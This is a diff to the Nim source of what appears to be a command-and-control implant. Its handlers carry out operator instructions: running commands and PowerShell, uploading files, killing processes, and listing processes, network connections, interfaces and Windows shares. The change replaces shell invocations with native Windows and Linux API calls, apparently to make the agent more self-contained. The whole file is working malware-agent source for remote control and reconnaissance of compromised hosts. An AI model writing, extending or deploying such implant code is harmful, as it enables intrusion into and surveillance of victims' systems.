@@ -6,8 +6,15 @@ import std/base64
 import std/random
 import std/options
 import std/algorithm
+import std/times
+import std/strformat
+import std/sequtils
+import std/widestrs
 import system
 import posix
+
+when defined(windows):
+  import winlean
 
 
 proc toString*(str: seq[uint8]): string =
@@ -83,9 +90,6 @@ const
   removeFailureMessage* = "Failed to remove target"
   environmentVariableNotFoundMessage* = "Environment variable not found"
   treeGenerationFailureMessage* = "Failed to enumerate directory tree"
-  quotedEmptyPath* = "\"\""
-  doubleQuoteString* = "\""
-  escapedDoubleQuoteString* = "\"\""
 
   instructionLoadModule* = "loadmodule"
   instructionLs* = "ls"
@@ -112,20 +116,6 @@ const
   instructionNetstat* = "netstat"
   instructionIpConfig* = "ipconfig"
   instructionEnumerateShares* = "enumerateshares"
-
-when defined(windows):
-  const
-    shellExecutable* = "cmd.exe"
-    shellFlag* = "/C"
-    listDirectoryCommand* = "dir "
-    processListCommand* = "tasklist"
-else:
-  const
-    shellExecutable* = "bash"
-    shellFlag* = "-c"
-    listDirectoryCommand* = "ls -la "
-    processListCommand* = "ps -aux"
-
 
 type
   C2Message* = object
@@ -219,30 +209,6 @@ proc decodeString(data: string): string =
     return emptyString
 
 
-proc quotePathForShell(path: string): string =
-  when defined(windows):
-    if path.len == 0:
-      return quotedEmptyPath
-    result = doubleQuoteString
-    for ch in path:
-      if ch == '"':
-        result.add(escapedDoubleQuoteString)
-      else:
-        result.add(ch)
-    result.add(doubleQuoteString)
-  else:
-    result = quoteShell(path)
-
-
-proc execShellCommand(command: string): string =
-  if command.len == 0:
-    return emptyString
-  try:
-    result = execProcess(shellExecutable, args=[shellFlag, command], options={poUsePath})
-  except OSError:
-    result = commandExecutionFailureMessage
-
-
 proc buildCommand(cmd, args: string): string =
   if cmd.len == 0:
     return args
@@ -274,16 +240,204 @@ proc handleChangeDirectory(path: string): string =
     return changeDirFailureMessage
 
 
+proc formatPermissions(perms: set[FilePermission], kind: PathComponent): string =
+  var result = newString(10)
+  result[0] = (case kind
+    of pcDir: 'd'
+    of pcLinkToDir, pcLinkToFile: 'l'
+    else: '-'
+  )
+  let flags = [
+    (fpUserRead, 'r'), (fpUserWrite, 'w'), (fpUserExec, 'x'),
+    (fpGroupRead, 'r'), (fpGroupWrite, 'w'), (fpGroupExec, 'x'),
+    (fpOthersRead, 'r'), (fpOthersWrite, 'w'), (fpOthersExec, 'x')
+  ]
+  for idx, entry in pairs(flags):
+    result[idx + 1] = if entry[0] in perms: entry[1] else: '-'
+  result
+
+
+proc formatTimestamp(value: times.Time): string =
+  value.format("MMM dd HH:mm")
+
+
+proc formatDirectoryEntry(path: string, name: string, info: FileInfo): string =
+  let perms = formatPermissions(info.permissions, info.kind)
+  let sizeStr = alignRight($info.size, 12)
+  let timestamp = formatTimestamp(info.lastWriteTime)
+  fmt"{perms} {sizeStr} {timestamp} {name}"
+
+
+proc collectDirectoryEntries(target: string): tuple[entries: seq[string], error: string] =
+  var result: seq[string] = @[]
+  try:
+    let info = getFileInfo(target, followSymlinks = false)
+    result.add(formatDirectoryEntry(target, ".", info))
+  except CatchableError:
+    return (@[], changeDirFailureMessage)
+
+  let parent = parentDir(target)
+  if parent.len > 0 and dirExists(parent):
+    try:
+      let parentInfo = getFileInfo(parent, followSymlinks = false)
+      result.add(formatDirectoryEntry(parent, "..", parentInfo))
+    except CatchableError:
+      discard
+
+  var entries: seq[(string, FileInfo)] = @[]
+  try:
+    for name in listDir(target):
+      let fullPath = target / name
+      try:
+        let info = getFileInfo(fullPath, followSymlinks = false)
+        entries.add((name, info))
+      except CatchableError:
+        continue
+  except OSError:
+    return (@[], changeDirFailureMessage)
+
+  entries.sort(proc(a, b: (string, FileInfo)): int =
+    cmp(a[0].toLowerAscii(), b[0].toLowerAscii())
+  )
+
+  for entry in entries:
+    result.add(formatDirectoryEntry(target / entry[0], entry[0], entry[1]))
+
+  (result, emptyString)
+
+
 proc handleListDirectory(path: string): string =
   var target = path
   if target.len == 0:
     target = getCurrentDir()
-  let safeCmd = quotePathForShell(target)
-  execShellCommand(listDirectoryCommand & safeCmd)
+  if fileExists(target) and not dirExists(target):
+    try:
+      let info = getFileInfo(target, followSymlinks = false)
+      return formatDirectoryEntry(target, lastPathPart(target), info)
+    except CatchableError:
+      return fileDoesNotExistMessage
+  if not dirExists(target):
+    return fileDoesNotExistMessage
+
+  let (entries, error) = collectDirectoryEntries(target)
+  if error.len > 0:
+    return error
+  entries.join("\n")
+
+
+when defined(linux):
+  proc isNumeric(value: string): bool =
+    result = value.len > 0
+    for ch in value:
+      if ch notin {'0'..'9'}:
+        return false
+
+
+  proc readProcessCommandLine(path: string): string =
+    try:
+      let data = readFile(path)
+      if data.len == 0:
+        return emptyString
+      var parts = data.split('\0')
+      parts = parts.filter(proc(x: string): bool = x.len > 0)
+      if parts.len == 0:
+        return emptyString
+      parts.join(" ")
+    except CatchableError:
+      emptyString
+
+
+  proc readProcessStat(path: string): tuple[ppid: string, name: string] =
+    try:
+      let content = readFile(path).strip()
+      if content.len == 0:
+        return (emptyString, emptyString)
+      var fields: seq[string] = @[]
+      var buffer = emptyString
+      var insideName = false
+      for ch in content:
+        if ch == '(' and not insideName:
+          insideName = true
+          continue
+        if ch == ')' and insideName:
+          fields.add(buffer)
+          buffer = emptyString
+          insideName = false
+          continue
+        if insideName:
+          buffer.add(ch)
+          continue
+        if ch == ' ':
+          if buffer.len > 0:
+            fields.add(buffer)
+            buffer = emptyString
+        else:
+          buffer.add(ch)
+      if buffer.len > 0:
+        fields.add(buffer)
+      let ppid = if fields.len > 4: fields[4] else: emptyString
+      let name = if fields.len > 1: fields[1] else: emptyString
+      (ppid, name)
+    except CatchableError:
+      (emptyString, emptyString)
 
 
 proc handleListProcesses(): string =
-  execShellCommand(processListCommand)
+  when defined(windows):
+    const TH32CS_SNAPPROCESS = 0x00000002.DWORD
+
+    type
+      ProcessEntry32A = object
+        dwSize: DWORD
+        cntUsage: DWORD
+        th32ProcessID: DWORD
+        th32DefaultHeapID: ULONG_PTR
+        th32ModuleID: DWORD
+        cntThreads: DWORD
+        th32ParentProcessID: DWORD
+        pcPriClassBase: LONG
+        dwFlags: DWORD
+        szExeFile: array[MAX_PATH, char]
+
+    proc CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD): HANDLE {.stdcall, dynlib: "kernel32", importc.}
+    proc Process32FirstA(hSnapshot: HANDLE, lppe: ptr ProcessEntry32A): WINBOOL {.stdcall, dynlib: "kernel32", importc.}
+    proc Process32NextA(hSnapshot: HANDLE, lppe: ptr ProcessEntry32A): WINBOOL {.stdcall, dynlib: "kernel32", importc.}
+
+    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0.DWORD)
+    if snapshot == INVALID_HANDLE_VALUE:
+      return commandExecutionFailureMessage
+    var entry: ProcessEntry32A
+    entry.dwSize = DWORD(sizeof(entry))
+    var lines: seq[string] = @["PID\tPPID\tThreads\tExecutable"]
+    var success = Process32FirstA(snapshot, addr entry) != 0
+    while success:
+      let exeName = $cast[cstring](addr entry.szExeFile[0])
+      lines.add(fmt"{entry.th32ProcessID}\t{entry.th32ParentProcessID}\t{entry.cntThreads}\t{exeName}")
+      success = Process32NextA(snapshot, addr entry) != 0
+    discard CloseHandle(snapshot)
+    lines.join("\n")
+  elif defined(linux):
+    let procDir = "/proc"
+    if not dirExists(procDir):
+      return operationNotSupportedMessage
+    var entries: seq[tuple[pid: int, line: string]] = @[]
+    for name in listDir(procDir):
+      if not isNumeric(name):
+        continue
+      let pid = parseInt(name)
+      let basePath = procDir / name
+      let cmdline = readProcessCommandLine(basePath / "cmdline")
+      let statData = readProcessStat(basePath / "stat")
+      let command = if cmdline.len > 0: cmdline else: statData.name
+      let ppid = if statData.ppid.len > 0: statData.ppid else: "0"
+      entries.add((pid, fmt"{pid}\t{ppid}\t{command}"))
+    entries.sort(proc(a, b: (int, string)): int = cmp(a.pid, b.pid))
+    var lines: seq[string] = @["PID\tPPID\tCommand"]
+    for entry in entries:
+      lines.add(entry.line)
+    lines.join("\n")
+  else:
+    operationNotSupportedMessage
 
 
 proc readFileContents(path: string, data: var string): string =
@@ -322,7 +476,15 @@ proc handleUpload(path, content: string): string =
 proc handleRun(command: string): string =
   if command.len == 0:
     return missingCommandMessage
-  execShellCommand(command)
+  try:
+    let parts = parseCmdLine(command)
+    if parts.len == 0:
+      return missingCommandMessage
+    let executable = parts[0]
+    let args = if parts.len > 1: parts[1..^1] else: @[]
+    execProcess(executable, args = args, options = {poUsePath, poStdErrToStdOut})
+  except CatchableError:
+    commandExecutionFailureMessage
 
 
 proc handlePowershell(command: string): string =
@@ -407,12 +569,16 @@ proc handleKillProcess(pidValue: string): string =
   except ValueError:
     return invalidProcessIdMessage
   when defined(windows):
-    let command = "taskkill /PID " & $parsedPid & " /F"
-    let output = execShellCommand(command)
-    if output.len == 0:
+    const PROCESS_TERMINATE = 0x0001.DWORD
+    let processHandle = OpenProcess(PROCESS_TERMINATE, 0.WINBOOL, DWORD(parsedPid))
+    if processHandle == 0:
+      return killProcessFailureMessage
+    let terminated = TerminateProcess(processHandle, 1.DWORD)
+    discard CloseHandle(processHandle)
+    if terminated != 0:
       okMessage
     else:
-      output
+      killProcessFailureMessage
   else:
     if (kill(Pid(parsedPid), SIGTERM) == 0) or (kill(Pid(parsedPid), SIGKILL) == 0):
       okMessage
@@ -473,9 +639,19 @@ proc handleGetEnv(name: string): string =
 
 
 proc handleWhoami(): string =
-  let output = execShellCommand("whoami")
-  if output.len > 0:
-    return output.strip()
+  when defined(posix):
+    let uid = geteuid()
+    let pwdEntry = getpwuid(uid)
+    if pwdEntry != nil and pwdEntry.pw_name != nil:
+      return $pwdEntry.pw_name
+    let login = getlogin()
+    if login != nil:
+      return $login
+  elif defined(windows):
+    var buffer: array[257, WCHAR]
+    var size: DWORD = DWORD(buffer.len)
+    if GetUserNameW(buffer.addr, addr size) != 0:
+      return $cast[WideCString](buffer.addr)
   let candidates = ["USER", "USERNAME", "LOGNAME"]
   for name in candidates:
     let value = getEnv(name, emptyString)
@@ -484,24 +660,149 @@ proc handleWhoami(): string =
   environmentVariableNotFoundMessage
 
 
+when defined(linux):
+  const tcpStates = [
+    "UNKNOWN", "ESTABLISHED", "SYN_SENT", "SYN_RECV", "FIN_WAIT1",
+    "FIN_WAIT2", "TIME_WAIT", "CLOSE", "CLOSE_WAIT", "LAST_ACK",
+    "LISTEN", "CLOSING", "NEW_SYN_RECV"
+  ]
+
+
+  proc parseAddress(hexAddr: string): string =
+    let parts = hexAddr.split(":")
+    if parts.len != 2:
+      return hexAddr
+    let ipPart = parts[0]
+    let portPart = parts[1]
+    if ipPart.len != 8:
+      return hexAddr
+    try:
+      let port = parseHexInt(portPart)
+      let bytes = @[parseHexInt(ipPart[6..7]), parseHexInt(ipPart[4..5]), parseHexInt(ipPart[2..3]), parseHexInt(ipPart[0..1])]
+      fmt"{bytes[0]}.{bytes[1]}.{bytes[2]}.{bytes[3]}:{port}"
+    except CatchableError:
+      hexAddr
+
+
+  proc parseProcNet(path, proto: string, output: var seq[string]) =
+    try:
+      let content = readFile(path)
+      let lines = content.splitLines()
+      if lines.len <= 1:
+        return
+      for line in lines[1..^1]:
+        let parts = line.splitWhitespace()
+        if parts.len < 4:
+          continue
+        let localAddr = parseAddress(parts[1])
+        let remoteAddr = parseAddress(parts[2])
+        let stateIdx = try:
+          parseHexInt(parts[3])
+        except CatchableError:
+          0
+        let state = if stateIdx < tcpStates.len: tcpStates[stateIdx] else: tcpStates[0]
+        output.add(fmt"{proto}\t{localAddr}\t{remoteAddr}\t{state}")
+    except CatchableError:
+      discard
+
+
+when defined(posix):
+  type
+    PIfAddrs = ptr Ifaddrs
+
+  proc toIpString(addr: ptr Sockaddr): string =
+    if addr == nil:
+      return emptyString
+    case addr.sa_family
+    of AF_INET:
+      var buffer: array[INET_ADDRSTRLEN, char]
+      let sin = cast[ptr Sockaddr_in](addr)
+      if inet_ntop(AF_INET, addr sin.sin_addr, addr buffer[0], buffer.len.cuint) != nil:
+        result = $cast[cstring](addr buffer[0])
+    of AF_INET6:
+      var buffer: array[INET6_ADDRSTRLEN, char]
+      let sin6 = cast[ptr Sockaddr_in6](addr)
+      if inet_ntop(AF_INET6, addr sin6.sin6_addr, addr buffer[0], buffer.len.cuint) != nil:
+        result = $cast[cstring](addr buffer[0])
+    else:
+      result = emptyString
+
+
 proc handleNetstat(): string =
-  execShellCommand("netstat -an")
+  when defined(linux):
+    var lines: seq[string] = @["Proto\tLocal Address\tRemote Address\tState"]
+    parseProcNet("/proc/net/tcp", "tcp", lines)
+    parseProcNet("/proc/net/tcp6", "tcp6", lines)
+    parseProcNet("/proc/net/udp", "udp", lines)
+    parseProcNet("/proc/net/udp6", "udp6", lines)
+    if lines.len == 1:
+      return operationNotSupportedMessage
+    lines.join("\n")
+  else:
+    operationNotSupportedMessage
 
 
 proc handleIpConfig(): string =
-  when defined(windows):
-    execShellCommand("ipconfig /all")
+  when defined(posix):
+    var ifaddr: PIfAddrs
+    if getifaddrs(addr ifaddr) != 0:
+      return commandExecutionFailureMessage
+    var lines: seq[string] = @[]
+    var cursor = ifaddr
+    while cursor != nil:
+      let rawName = cursor.ifa_name
+      if rawName == nil:
+        cursor = cursor.ifa_next
+        continue
+      let interfaceName = $rawName
+      if interfaceName.len == 0:
+        cursor = cursor.ifa_next
+        continue
+      let address = toIpString(cursor.ifa_addr)
+      if address.len > 0:
+        lines.add(fmt"{interfaceName}: {address}")
+      cursor = cursor.ifa_next
+    freeifaddrs(ifaddr)
+    if lines.len == 0:
+      return operationNotSupportedMessage
+    lines.sort(proc(a, b: string): int = cmp(a, b))
+    lines.join("\n")
   else:
-    let output = execShellCommand("ip addr show")
-    if output.len == 0:
-      execShellCommand("ifconfig -a")
-    else:
-      output
+    operationNotSupportedMessage
 
 
 proc handleEnumerateShares(): string =
   when defined(windows):
-    execShellCommand("net share")
+    type
+      SHARE_INFO_1 = object
+        shi1_netname: LPWSTR
+        shi1_type: DWORD
+        shi1_remark: LPWSTR
+
+    proc NetShareEnum(serverName: LPCWSTR, level: DWORD, buffer: ptr pointer, prefmaxlen: DWORD, entriesRead: ptr DWORD, totalEntries: ptr DWORD, resumeHandle: ptr DWORD): DWORD {.stdcall, dynlib: "Netapi32", importc.}
+    proc NetApiBufferFree(buffer: pointer): DWORD {.stdcall, dynlib: "Netapi32", importc.}
+
+    const NERR_Success = 0.DWORD
+    var buffer: pointer
+    var entriesRead: DWORD
+    var totalEntries: DWORD
+    var resume: DWORD
+    let status = NetShareEnum(nil, 1.DWORD, addr buffer, DWORD(-1), addr entriesRead, addr totalEntries, addr resume)
+    if status != NERR_Success:
+      return commandExecutionFailureMessage
+    var lines: seq[string] = @[]
+    try:
+      for i in 0 ..< int(entriesRead):
+        let offset = cast[ByteAddress](buffer) + ByteAddress(i) * ByteAddress(sizeof(SHARE_INFO_1))
+        let infoPtr = cast[ptr SHARE_INFO_1](offset)
+        let name = $cast[WideCString](infoPtr.shi1_netname)
+        let remark = if infoPtr.shi1_remark != nil: $cast[WideCString](infoPtr.shi1_remark) else: emptyString
+        lines.add(if remark.len > 0: fmt"{name}\t{remark}" else: name)
+    finally:
+      discard NetApiBufferFree(buffer)
+    if lines.len == 0:
+      return operationNotSupportedMessage
+    lines.join("\n")
   else:
     operationNotSupportedMessage
 
